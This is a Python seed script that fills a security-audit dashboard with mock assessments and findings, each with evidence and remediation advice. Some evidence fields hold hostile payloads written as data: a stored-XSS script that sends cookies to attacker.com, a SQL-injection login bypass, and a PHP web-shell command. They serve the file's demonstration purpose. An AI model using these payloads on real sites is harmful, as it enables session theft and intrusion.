"""
Seed the SCOPE database with realistic mock data.
Mirrors the mockData.js file in the frontend.
"""
from datetime import datetime
import models


def seed_database(db):
    print("Seeding SCOPE database...")

    # Assessments
    assessments_data = [
        {
            "name": "Web Application Audit",
            "status": "active",
            "last_run": datetime(2026, 3, 19, 13, 0, 0),
            "description": "Full audit of the public-facing web application",
            "target": "192.168.1.100",
            "created_at": datetime(2026, 2, 15, 9, 0, 0),
        },
        {
            "name": "Internal Network Scan",
            "status": "complete",
            "last_run": datetime(2026, 3, 17, 10, 30, 0),
            "description": "Internal network exposure review",
            "target": "192.168.1.0/24",
            "created_at": datetime(2026, 2, 20, 11, 0, 0),
        },
        {
            "name": "Linux Server Hardening",
            "status": "active",
            "last_run": datetime(2026, 3, 18, 8, 0, 0),
            "description": "CIS benchmark hardening review for production servers",
            "target": "prod-server-01",
            "created_at": datetime(2026, 3, 1, 10, 0, 0),
        },
        {
            "name": "SSH Configuration Review",
            "status": "complete",
            "last_run": datetime(2026, 3, 10, 15, 0, 0),
            "description": "SSH daemon configuration audit",
            "target": "all-servers",
            "created_at": datetime(2026, 3, 5, 9, 0, 0),
        },
        {
            "name": "File Permission Audit",
            "status": "draft",
            "last_run": None,
            "description": "World-writable files and SUID/SGID review",
            "target": "prod-server-01",
            "created_at": datetime(2026, 3, 19, 14, 0, 0),
        },
    ]

    db_assessments = []
    for a_data in assessments_data:
        a = models.Assessment(**a_data)
        db.add(a)
        db.flush()
        db_assessments.append(a)

    # Map assessment name -> db object
    a_map = {a.name: a for a in db_assessments}

    # Findings — abbreviated for seed (full set in mockData.js)
    findings_data = [
        # Web Application Audit
        {
            "assessment_id": a_map["Web Application Audit"].id,
            "severity": "critical",
            "title": "SQL Injection in Login Endpoint",
            "category": "Authentication",
            "status": "open",
            "description": "The login endpoint accepts unsanitized user input directly in SQL queries.",
            "evidence": "POST /api/auth/login\nPayload: { \"username\": \"admin' OR '1'='1\" }\nResponse: 200 OK",
            "remediation_simple": "Use parameterized queries. Never build SQL by concatenating user input.",
            "remediation_technical": "cursor.execute('SELECT * FROM users WHERE username = ?', (username,))",
            "date_found": datetime(2026, 3, 19, 13, 5, 0),
        },
        {
            "assessment_id": a_map["Web Application Audit"].id,
            "severity": "critical",
            "title": "Stored XSS in User Profile",
            "category": "Configuration",
            "status": "open",
            "description": "The user profile bio field does not sanitize HTML input.",
            "evidence": "Setting bio to: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
            "remediation_simple": "Strip or encode HTML characters. Use DOMPurify on the frontend.",
            "remediation_technical": "import bleach\nclean_bio = bleach.clean(user_input, strip=True)",
            "date_found": datetime(2026, 3, 19, 13, 10, 0),
        },
        {
            "assessment_id": a_map["Web Application Audit"].id,
            "severity": "critical",
            "title": "Remote Code Execution via File Upload",
            "category": "Configuration",
            "status": "open",
            "description": "The file upload endpoint accepts arbitrary file types including server-side scripts.",
            "evidence": "Uploaded shell.php — accessed /uploads/shell.php?cmd=id — returned uid=33(www-data)",
            "remediation_simple": "Restrict file uploads to safe types. Store outside webroot.",
            "remediation_technical": "ALLOWED = {'image/jpeg', 'image/png'}\nif file.content_type not in ALLOWED: raise HTTPException(400)",
            "date_found": datetime(2026, 3, 19, 13, 15, 0),
        },
        {
            "assessment_id": a_map["Web Application Audit"].id,
            "severity": "high",
            "title": "Missing HTTPS / TLS Not Enforced",
            "category": "Network",
            "status": "open",
            "description": "The application serves content over plain HTTP without redirecting to HTTPS.",
            "evidence": "curl -v http://192.168.1.100/api/auth/login returned HTTP 200 — no redirect to HTTPS.",
            "remediation_simple": "Enable HTTPS and redirect all HTTP traffic to HTTPS.",
            "remediation_technical": "server { listen 80; return 301 https://$host$request_uri; }",
            "date_found": datetime(2026, 3, 19, 13, 20, 0),
        },
        {
            "assessment_id": a_map["Web Application Audit"].id,
            "severity": "medium",
            "title": "Missing Content-Security-Policy Header",
            "category": "Configuration",
            "status": "open",
            "description": "No Content-Security-Policy header is set.",
            "evidence": "curl -I http://192.168.1.100/ — no Content-Security-Policy header.",
            "remediation_simple": "Add a Content-Security-Policy header.",
            "remediation_technical": "add_header Content-Security-Policy \"default-src 'self';\" always;",
            "date_found": datetime(2026, 3, 19, 13, 35, 0),
        },
        {
            "assessment_id": a_map["Web Application Audit"].id,
            "severity": "medium",
            "title": "Verbose Error Messages Leaking Stack Traces",
            "category": "Configuration",
            "status": "remediated",
            "description": "API errors return full Python stack traces to the client.",
            "evidence": "GET /api/users/invalid — returns 500 with full traceback.",
            "remediation_simple": "Never show detailed errors to users in production.",
            "remediation_technical": "@app.exception_handler(Exception)\nasync def handler(request, exc):\n    return JSONResponse(500, {'error': 'Internal error'})",
            "date_found": datetime(2026, 3, 19, 13, 45, 0),
        },
        {
            "assessment_id": a_map["Web Application Audit"].id,
            "severity": "low",
            "title": "Server Version Disclosure in Headers",
            "category": "Configuration",
            "status": "open",
            "description": "HTTP headers reveal server software versions.",
            "evidence": "Server: nginx/1.18.0, X-Powered-By: Python/3.9.7",
            "remediation_simple": "Configure server to hide version information.",
            "remediation_technical": "Nginx: server_tokens off;",
            "date_found": datetime(2026, 3, 19, 13, 55, 0),
        },
        # Internal Network Scan
        {
            "assessment_id": a_map["Internal Network Scan"].id,
            "severity": "high",
            "title": "Telnet Service Exposed on Port 23",
            "category": "Network",
            "status": "open",
            "description": "Telnet service is accessible on several internal hosts.",
            "evidence": "nmap -p 23 192.168.1.0/24 — hosts .5, .12, .34 have port 23 open",
            "remediation_simple": "Disable Telnet. Replace with SSH.",
            "remediation_technical": "systemctl stop telnet && systemctl disable telnet",
            "date_found": datetime(2026, 3, 17, 10, 35, 0),
        },
        {
            "assessment_id": a_map["Internal Network Scan"].id,
            "severity": "high",
            "title": "FTP with Anonymous Login Enabled",
            "category": "Authentication",
            "status": "open",
            "description": "FTP server allows anonymous login and exposes configuration backups.",
            "evidence": "ftp 192.168.1.20 — anonymous login shows /backups/ directory",
            "remediation_simple": "Disable anonymous FTP access. Replace with SFTP.",
            "remediation_technical": "vsftpd.conf: anonymous_enable=NO",
            "date_found": datetime(2026, 3, 17, 10, 40, 0),
        },
        {
            "assessment_id": a_map["Internal Network Scan"].id,
            "severity": "medium",
            "title": "SMB Signing Disabled on Domain Hosts",
            "category": "Network",
            "status": "open",
            "description": "Multiple Windows hosts have SMB signing disabled, enabling relay attacks.",
            "evidence": "nmap --script smb-security-mode — message_signing: disabled",
            "remediation_simple": "Enable SMB signing via Group Policy.",
            "remediation_technical": "GP: Computer Config > Security Settings > 'Digitally sign communications (always)' = Enabled",
            "date_found": datetime(2026, 3, 17, 10, 45, 0),
        },
        # Linux Server Hardening
        {
            "assessment_id": a_map["Linux Server Hardening"].id,
            "severity": "critical",
            "title": "Root SSH Login Permitted",
            "category": "Authentication",
            "status": "open",
            "description": "The SSH daemon permits direct root login.",
            "evidence": "/etc/ssh/sshd_config — PermitRootLogin yes",
            "remediation_simple": "Disable root SSH login. Use sudo instead.",
            "remediation_technical": "/etc/ssh/sshd_config: PermitRootLogin no\nsystemctl restart sshd",
            "date_found": datetime(2026, 3, 18, 8, 5, 0),
        },
        {
            "assessment_id": a_map["Linux Server Hardening"].id,
            "severity": "critical",
            "title": "Sudo Misconfiguration Allows Privilege Escalation",
            "category": "Permissions",
            "status": "open",
            "description": "A sudoers entry allows a service account to run /bin/bash as root without a password.",
            "evidence": "sudo -l -U webapp shows: (ALL) NOPASSWD: /bin/bash",
            "remediation_simple": "Remove overly permissive sudoers rules.",
            "remediation_technical": "visudo — remove: webapp ALL=(ALL) NOPASSWD: /bin/bash",
            "date_found": datetime(2026, 3, 18, 8, 10, 0),
        },
        {
            "assessment_id": a_map["Linux Server Hardening"].id,
            "severity": "high",
            "title": "Firewall (UFW) Not Enabled",
            "category": "Network",
            "status": "open",
            "description": "No host-based firewall is active.",
            "evidence": "ufw status — Status: inactive",
            "remediation_simple": "Enable UFW with a default-deny policy.",
            "remediation_technical": "ufw default deny incoming && ufw allow 22/tcp && ufw enable",
            "date_found": datetime(2026, 3, 18, 8, 15, 0),
        },
        {
            "assessment_id": a_map["Linux Server Hardening"].id,
            "severity": "medium",
            "title": "Password Policy Not Enforced (PAM)",
            "category": "Authentication",
            "status": "open",
            "description": "No minimum password complexity is configured via PAM.",
            "evidence": "cat /etc/pam.d/common-password — no pam_pwquality configured",
            "remediation_simple": "Configure PAM to enforce password complexity.",
            "remediation_technical": "apt install libpam-pwquality\npam_pwquality.so minlen=14 ucredit=-1 lcredit=-1 dcredit=-1",
            "date_found": datetime(2026, 3, 18, 8, 35, 0),
        },
        # SSH Configuration Review
        {
            "assessment_id": a_map["SSH Configuration Review"].id,
            "severity": "critical",
            "title": "SSH Protocol 1 Allowed",
            "category": "Configuration",
            "status": "open",
            "description": "SSHv1 is permitted which has known cryptographic weaknesses.",
            "evidence": "/etc/ssh/sshd_config — Protocol 1,2",
            "remediation_simple": "Configure SSH to only use Protocol 2.",
            "remediation_technical": "/etc/ssh/sshd_config: Protocol 2\nsystemctl restart sshd",
            "date_found": datetime(2026, 3, 10, 15, 5, 0),
        },
        {
            "assessment_id": a_map["SSH Configuration Review"].id,
            "severity": "high",
            "title": "Weak SSH Cipher Suites Enabled",
            "category": "Configuration",
            "status": "open",
            "description": "SSH advertises deprecated ciphers including arcfour (RC4).",
            "evidence": "nmap --script ssh2-enum-algos — shows arcfour in cipher list",
            "remediation_simple": "Restrict SSH to modern, approved cipher suites.",
            "remediation_technical": "Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com",
            "date_found": datetime(2026, 3, 10, 15, 10, 0),
        },
        {
            "assessment_id": a_map["SSH Configuration Review"].id,
            "severity": "medium",
            "title": "SSH MaxAuthTries Too High",
            "category": "Configuration",
            "status": "remediated",
            "description": "MaxAuthTries is set to 10.",
            "evidence": "/etc/ssh/sshd_config — MaxAuthTries 10",
            "remediation_simple": "Reduce MaxAuthTries to 3.",
            "remediation_technical": "/etc/ssh/sshd_config: MaxAuthTries 3",
            "date_found": datetime(2026, 3, 10, 15, 15, 0),
        },
    ]

    for f_data in findings_data:
        f = models.Finding(**f_data)
        db.add(f)

    # Runs
    runs_data = [
        {"assessment_id": a_map["Web Application Audit"].id, "date": datetime(2026, 3, 19, 13, 0, 0), "status": "complete", "duration": "4m 32s", "finding_count": 12},
        {"assessment_id": a_map["Web Application Audit"].id, "date": datetime(2026, 3, 12, 10, 0, 0), "status": "complete", "duration": "4m 18s", "finding_count": 10},
        {"assessment_id": a_map["Internal Network Scan"].id, "date": datetime(2026, 3, 17, 10, 30, 0), "status": "complete", "duration": "8m 47s", "finding_count": 7},
        {"assessment_id": a_map["Linux Server Hardening"].id, "date": datetime(2026, 3, 18, 8, 0, 0), "status": "complete", "duration": "3m 55s", "finding_count": 15},
        {"assessment_id": a_map["Linux Server Hardening"].id, "date": datetime(2026, 3, 4, 8, 0, 0), "status": "failed", "duration": "1m 12s", "finding_count": 0},
        {"assessment_id": a_map["SSH Configuration Review"].id, "date": datetime(2026, 3, 10, 15, 0, 0), "status": "complete", "duration": "2m 10s", "finding_count": 4},
    ]

    for r_data in runs_data:
        r = models.Run(**r_data)
        db.add(r)

    # Reports
    reports_data = [
        {
            "name": "Web Application Audit — Full Report",
            "assessment_id": a_map["Web Application Audit"].id,
            "assessment_name": "Web Application Audit",
            "format": "PDF",
            "date": datetime(2026, 3, 19, 14, 30, 0),
            "size": "1.2 MB",
        },
        {
            "name": "Internal Network Scan — Executive Summary",
            "assessment_id": a_map["Internal Network Scan"].id,
            "assessment_name": "Internal Network Scan",
            "format": "HTML",
            "date": datetime(2026, 3, 17, 11, 30, 0),
            "size": "340 KB",
        },
        {
            "name": "Linux Server Hardening — Technical Report",
            "assessment_id": a_map["Linux Server Hardening"].id,
            "assessment_name": "Linux Server Hardening",
            "format": "Markdown",
            "date": datetime(2026, 3, 18, 9, 30, 0),
            "size": "88 KB",
        },
        {
            "name": "SSH Configuration Review — JSON Export",
            "assessment_id": a_map["SSH Configuration Review"].id,
            "assessment_name": "SSH Configuration Review",
            "format": "JSON",
            "date": datetime(2026, 3, 10, 16, 0, 0),
            "size": "24 KB",
        },
    ]

    for rep_data in reports_data:
        rep = models.Report(**rep_data)
        db.add(rep)

    # Activity
    activity_data = [
        {"type": "run_complete", "message": "Assessment run completed: Web Application Audit", "detail": "12 findings detected (3 critical)", "timestamp": datetime(2026, 3, 19, 13, 4, 32), "icon": "check", "color": "success"},
        {"type": "report_generated", "message": "Report generated: Web Application Audit — Full Report", "detail": "PDF, 1.2 MB", "timestamp": datetime(2026, 3, 19, 14, 30, 0), "icon": "file", "color": "primary"},
        {"type": "run_complete", "message": "Assessment run completed: Linux Server Hardening", "detail": "15 findings detected (2 critical)", "timestamp": datetime(2026, 3, 18, 8, 3, 55), "icon": "check", "color": "success"},
        {"type": "finding_remediated", "message": "Finding marked as remediated", "detail": "Verbose Error Messages Leaking Stack Traces — Web Application Audit", "timestamp": datetime(2026, 3, 17, 16, 20, 0), "icon": "shield", "color": "success"},
        {"type": "run_complete", "message": "Assessment run completed: Internal Network Scan", "detail": "7 findings detected", "timestamp": datetime(2026, 3, 17, 10, 38, 47), "icon": "check", "color": "success"},
        {"type": "assessment_created", "message": "New assessment created: File Permission Audit", "detail": "Status: Draft", "timestamp": datetime(2026, 3, 19, 14, 0, 0), "icon": "plus", "color": "primary"},
    ]

    for act_data in activity_data:
        act = models.ActivityEvent(**act_data)
        db.add(act)

    db.commit()
    print("Database seeded successfully.")
